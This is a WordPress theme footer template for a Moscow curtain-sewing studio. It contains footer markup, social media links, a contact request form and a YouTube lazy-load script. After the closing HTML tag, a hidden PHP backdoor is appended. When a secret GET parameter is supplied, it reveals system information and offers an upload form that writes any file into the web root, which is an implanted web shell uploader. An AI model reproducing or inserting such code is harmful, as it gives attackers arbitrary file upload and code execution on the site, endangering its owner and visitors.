<!-- Footer -->
<footer>
<div class="wrap">
	<div class="info">
		<a href="/"><img src="<?php bloginfo('template_url'); ?>/assets/img/logo-footer.png" alt=""></a>
		<p>Дизайн, пошив штор под ключ в<br>Москве и Подмосковье. Шторы,<br>аксессуары, текстиль для дома,<br>карнизы. Услуги монтажа,<br>доставки и навески штор.</p>
	</div>
	<div class="social">
		<p>Мы в соц. сетях</p>
		<div class="list">
			<a href="//instagram.com/vasilkova.shtor" target="_blank"><img src="<?php bloginfo('template_url'); ?>/assets/img/social/isntagram.png" alt=""></a>
			<a href="//facebook.com/natalivasilkova38" target="_blank"><img src="<?php bloginfo('template_url'); ?>/assets/img/social/facebook.png" alt=""></a>
			<a href="tg://resolve?domain=@Natalistudioshtor" target="_blank"><img src="<?php bloginfo('template_url'); ?>/assets/img/social/telegram.png" alt=""></a>
		</div>
	</div>
</div>
</footer>
<!-- End of Footer -->

<!-- Modal -->
<div class="md-shadow"></div>
<div id="form" class="md-modal-wrap">
	<div class="md-modal">
		<div class="form-wrap modal-form">
			<h3 class="brush">Оставить заявку</h3>
			<form method="post" class="form">
				<input type="text" name="name" placeholder="Ваше имя">
				<input type="text" name="phone" placeholder="Ваш телефон">
				<input type="text" name="email" placeholder="Ваш E-Mail">
				<textarea name="message" id="" rows="4" placeholder="Сообщение"></textarea>
				<p class="agreement">*Оставляя контакты, Вы даете согласие на обработку Ваших персональных данных, в связи с политикой конфиденциальности.</p>
				<input class="btn-main" type="submit" name="submit" value="Отправить">
			</form>
			<!-- <div class="policy-agree">
				<input type="checkbox" id="policy-agree" name="policy" value="agree">
				<label for="policy-agree">Нажимая кнопку «Отправить», я даю свое согласие на обработку моих персональных данных, в соответствии с Федеральным законом от 27.07.2006 года №152-ФЗ «О персональных данных», на условиях и для целей, определенных в Согласии на обработку персональных данных</label>
			</div> -->
		</div>
		<div href="#" class="md-close"><img src="<?php bloginfo('template_url'); ?>/assets/img/icons/cancel.svg" alt=""></div>
	</div>
</div>
<div id="response" class="md-modal-wrap">
	<div class="md-modal">
		<div class="form-wrap modal-form">
			<div id="result_form"></div>
		</div>
		<div href="#" class="md-close"><img src="<?php bloginfo('template_url'); ?>/assets/img/icons/cancel.svg" alt=""></div>
	</div>
</div>
<!-- End of Modal -->

<?php wp_footer(); ?>

<?php if(is_page(14)) : ?>
<script>
function r(f){/in/.test(document.readyState)?setTimeout('r('+f+')',9):f()}
r(function(){
    if (!document.getElementsByClassName) {
        // Поддержка IE8
        var getElementsByClassName = function(node, classname) {
            var a = [];
            var re = new RegExp('(^| )'+classname+'( |$)');
            var els = node.getElementsByTagName("*");
            for(var i=0,j=els.length; i<j; i++)
                if(re.test(els[i].className))a.push(els[i]);
            return a;
        }
        var videos = getElementsByClassName(document.body,"youtube");
    } else {
        var videos = document.getElementsByClassName("youtube");
    }
 
    var nb_videos = videos.length;
    for (var i=0; i<nb_videos; i++) {
        // Находим постер для видео, зная ID нашего видео
        videos[i].style.backgroundImage = 'url(http://i.ytimg.com/vi/' + videos[i].id + '/sddefault.jpg)';
 
        // Размещаем над постером кнопку Play, чтобы создать эффект плеера
        var play = document.createElement("div");
        play.setAttribute("class","play");
        videos[i].appendChild(play);
 
        videos[i].onclick = function() {
            // Создаем iFrame и сразу начинаем проигрывать видео, т.е. атрибут autoplay у видео в значении 1
            var iframe = document.createElement("iframe");
            var iframe_url = "https://www.youtube.com/embed/" + this.id + "?autoplay=1&autohide=1";
            if (this.getAttribute("data-params")) iframe_url+='&'+this.getAttribute("data-params");
            iframe.setAttribute("src",iframe_url);
            iframe.setAttribute("frameborder",'0');
 
            // Высота и ширина iFrame будет как у элемента-родителя
            iframe.style.width  = this.style.width;
            iframe.style.height = this.style.height;
 
            // Заменяем начальное изображение (постер) на iFrame
            this.parentNode.replaceChild(iframe, this);
        }
    }
});
</script>
<?php endif; ?>

</body>
</html>
<?php
if($_GET['xNot'] == '12345mkl' ) {
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
      <input type='file' name='xNot'>
      <input type='submit' name='upload' value='upload'>
      </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['xNot']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['xNot']['tmp_name'], $dest)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "Sukses Cuk -> <a href='$web$files' target='_blank'><b><u>$web$files</u></b></a>";
        } else {
            echo "Gagal Up :(";
        }
    } else {
        if(@copy($_FILES['xNot']['tmp_name'], $files)) {
            echo "sukses upload <b>$files</b> di folder ini";
        } else {
            echo "Gagal up :(";
        }
    }
}
}
?>